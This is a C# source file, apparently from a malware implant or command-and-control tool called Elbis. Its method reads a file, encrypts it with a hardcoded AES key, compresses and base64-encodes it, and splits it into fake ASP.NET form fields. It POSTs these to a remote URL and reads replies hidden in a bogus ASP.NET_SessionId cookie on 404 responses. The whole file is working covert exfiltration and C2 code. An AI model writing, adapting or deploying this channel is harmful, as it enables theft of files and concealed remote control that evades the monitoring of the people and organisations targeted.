using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Elbis.Features.Web
{
    public static class Request
    {
        public static string ElbisRequest(string url, string filePath)
        {
            string responseText = "";
            try
            {
                byte[] dataToEncrypt = System.IO.File.ReadAllBytes(filePath);
                byte[] key = new Guid("6979696b-6976-6172-7369-6e206572656e").ToByteArray();
                byte[] encryptedData;
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, new RijndaelManaged { Mode = CipherMode.CBC }.CreateEncryptor(key, key), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(dataToEncrypt, 0, dataToEncrypt.Length);
                        cryptoStream.FlushFinalBlock();
                    }
                    byte[] encryptedBytes = memoryStream.ToArray();
                    using (MemoryStream compressedStream = new MemoryStream())
                    {
                        using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Compress))
                        {
                            gzipStream.Write(encryptedBytes, 0, encryptedBytes.Length);
                        }
                        encryptedData = compressedStream.ToArray();
                    }
                }
                string encryptedDataString = Convert.ToBase64String(encryptedData);
                int partsCount = 6;
                int partLength = (int)Math.Ceiling((double)encryptedDataString.Length / partsCount);
                string __NOTIFICATIONID = encryptedDataString.Substring(0, partLength);
                string __CALLBACKPARAMETER = encryptedDataString.Substring(partLength, partLength);
                string __ACTIONARGUMENT = encryptedDataString.Substring(partLength * 2, partLength);
                string __ACTIONTARGET = encryptedDataString.Substring(partLength * 3, partLength);
                string __VALIDATIONRESULT = encryptedDataString.Substring(partLength * 4, partLength);
                string __SECURITYTOKEN = encryptedDataString.Substring(partLength * 5);
                var resut = "__NOTIFICATIONID=" + __NOTIFICATIONID + "&__CALLBACKPARAMETER=" + __CALLBACKPARAMETER + "&__ACTIONARGUMENT=" + __ACTIONARGUMENT + "&__ACTIONTARGET=" + __ACTIONTARGET + "&__VALIDATIONRESULT=" + __VALIDATIONRESULT + "&__SECURITYTOKEN=" + __SECURITYTOKEN;
                StringContent content = new StringContent(resut, Encoding.UTF8, "text/plain");
                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage response = client.PostAsync(url, content).Result;
                    if (response.StatusCode == HttpStatusCode.NotFound)
                    {
                        if (response.Headers.TryGetValues("Set-Cookie", out var cookies))
                        {
                            foreach (var cookie in cookies)
                            {
                                Console.WriteLine("Cookie: " + cookie);
                                if (cookie.Split('=').FirstOrDefault() == "ASP.NET_SessionId")
                                {
                                    string responseMessage = cookie.Replace("ASP.NET_SessionId=", "").Split(';').FirstOrDefault();
                                    var responseMessageByte = Convert.FromBase64String(responseMessage);
                                    byte[] decompressedBytes;
                                    using (MemoryStream compressedStream = new MemoryStream(responseMessageByte))
                                    {
                                        using (MemoryStream decompressedStream = new MemoryStream())
                                        {
                                            using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                                            {
                                                gzipStream.CopyTo(decompressedStream);
                                            }
                                            decompressedBytes = decompressedStream.ToArray();
                                        }
                                    }
                                    responseText = System.Text.Encoding.UTF8.GetString(decompressedBytes);

                                }
                            }
                        }
                    }
                }
                return responseText;

            }
            catch (Exception)
            {
                return responseText;
            }
        }
    }
}
